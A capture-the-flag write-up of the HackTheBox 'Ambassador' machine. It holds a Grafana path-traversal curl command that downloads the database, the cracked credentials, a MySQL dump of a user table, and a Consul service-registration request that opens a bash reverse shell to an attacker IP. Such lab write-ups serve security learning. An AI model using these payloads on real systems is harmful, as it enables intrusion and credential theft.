### Writeup and references
* https://malw0re.gitbook.io/notes/hackthebox/ambassador
* https://discuss.hashicorp.com/t/hcsec-2020-04-consuls-health-check-api-endpoints-may-disclose-information/18087/1
* https://developer.hashicorp.com/consul/api-docs/api-structure
* https://gist.github.com/A1vinSmith/b394bbafa7a7c726e7fe78ccdfc421c3
* https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API
* https://github.com/owalid/consul-rce

### Grafana on 3000
##### Searchsploit
It works but not promote to shell.

##### Curl
```txt
--path-as-is
              Tell curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not
              to do that.

              Providing --path-as-is multiple times has no extra effect.  Disable it again with --no-path-as-is.

              Example:
               curl --path-as-is https://example.com/../../etc/passwd

              See also --request-target. Added in 7.42.0.
```

```bash
curl --path-as-is "http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

##### Open it with SQLite
In table `data_source`. Found the user creds

grafana:dontStandSoCloseToMe63221!

### Mysql 3306
```bash
mysql -h $IP -u grafana -p
```
A little bit slow

```bash mysql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.358 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.162 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.143 sec)
```

base64 anEnglishManInNewYork027468

### SSH
```bash
ssh developer@$IP
```

### Enum
The Hashicorp Consul services API allows attackers to execute arbitrary commands on the target endpoint.

curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" \
	-X PUT \
	-H "Content-Type: application/json" \
	-d '{"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.11/80 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "alvinID01", "Name": "alvinName01", "Port": 80}' \
	http://127.0.0.1:8500/v1/agent/service/register

### Other writeups
* https://0xdf.gitlab.io/2023/01/28/htb-ambassador.html#shell-as-root